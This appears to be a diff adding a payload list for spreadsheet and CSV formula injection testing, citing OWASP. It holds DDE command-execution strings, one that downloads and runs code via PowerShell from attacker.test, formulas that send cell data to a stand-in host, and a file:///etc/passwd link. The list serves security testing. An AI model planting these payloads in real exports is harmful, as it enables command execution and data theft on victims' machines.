@@ -1,0 +1,45 @@
+# category: formula
+# description: Spreadsheet / CSV formula injection — Excel / LibreOffice / Google Sheets.
+# references: OWASP CSV Injection, Context IS "Comma Separated Vulnerabilities".
+# notes: Inert probe strings — none of these auto-fire, they prime a sink.
+
+=1+1
+=1+1+cmd|'/C calc'!A1
+=cmd|'/C calc'!A1
+=cmd|'/C powershell IEX(wget attacker.test/x)'!A1
+=2+5+cmd|' /C calc'!A0
+=HYPERLINK("http://x.test","click")
+=HYPERLINK("http://x.test"&A1,"click")
+=WEBSERVICE("http://x.test")
+=WEBSERVICE("http://x.test/"&A1)
+=IMPORTXML("http://x.test","//")
+=IMPORTDATA("http://x.test")
+=IMPORTRANGE("http://x.test","Sheet1!A1")
+=IMPORTHTML("http://x.test","table",1)
+=IMPORTFEED("http://x.test")
+=EXEC("calc.exe")
+=SYSTEM("id")
+=SHELL("/bin/sh -c id")
+=DDE("cmd";"/c calc";"!A0")
++cmd|'/C calc'!A1
+-cmd|'/C calc'!A1
+@SUM(1+1)*cmd|'/C calc'!A1
+@SUM(1+1)*HYPERLINK("http://x.test")
+=@SUM(1+1)*cmd|'/C calc'!A1
+%0d=1+1
+%0a=1+1
+=1+1%00
+=1+1%09
+=1+1%0d%0a
+
+# ── CSV injection via field start characters ─────────────────────────────
+=HYPERLINK("http://x.test?c="&A1,"click")
+=HYPERLINK("file:///etc/passwd","leak")
+=HYPERLINK("file://x.test/share","unc")
+=HYPERLINK("http://x.test?c="&SUBSTITUTE(A1," ","+"),"click")
+=HYPERLINK(CONCATENATE("http://x.test?c=",A1),"click")
+
+# ── Google Sheets specific ───────────────────────────────────────────────
+=GOOGLETRANSLATE(A1,"auto","en")
+=IMAGE("http://x.test/"&A1)
+=IMAGE("https://x.test/a.png",4,100,100)
